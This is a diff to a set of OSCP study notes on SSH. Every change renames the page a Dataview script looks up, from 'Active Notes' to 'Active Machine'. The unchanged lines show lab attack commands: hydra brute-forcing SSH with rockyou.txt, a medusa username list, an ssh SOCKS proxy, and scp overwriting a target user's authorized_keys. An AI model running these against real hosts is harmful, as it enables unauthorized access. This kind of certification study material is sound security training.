@@ -4,7 +4,7 @@
 
 These keys work together like a lock and key. The public key (`id_rsa.pub`) is installed on remote machines you want to connect to, while the private key (`id_rsa`) on your local machine proves your identity. Now, let’s download the private key and exit the FTP connection.
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
 const command = `ssh [USER]@${ip} -p [portno]`;
 
@@ -18,7 +18,7 @@ gedit id_rsa
 sudo chmod 600 id_rsa
 ```
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
 const command = `ssh -i id_rsa [user]@${ip}`;
 
@@ -56,7 +56,7 @@ SSH Private Key
 
 port forward our connection to the remote host's internal port
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
 const command = `ssh -D 9090 [user]@${ip}`;
 
@@ -110,7 +110,7 @@ medusa -U /home/satwossh/username-anarchy/thomas_smith_usernames.txt \
 hydra
 
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
 const command = `hydra -l [user] -P /usr/share/wordlists/rockyou.txt ssh://${ip}`;
 
@@ -130,7 +130,7 @@ We can see where the ‘ACCESS DENIED’ message is coming from but here’s the
 
 I am going to remove the restrictive preamble of the authorized_keys file and try to overwrite the original.
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
 const command = `scp -i id_rsa authorized_keys max@${ip}:/home/max/.ssh/authorized_keys`;
 
@@ -138,7 +138,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 if error try
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
 const command = `scp -O -i id_rsa authorized_keys max@${ip}:/home/max/.ssh/authorized_keys`;
 
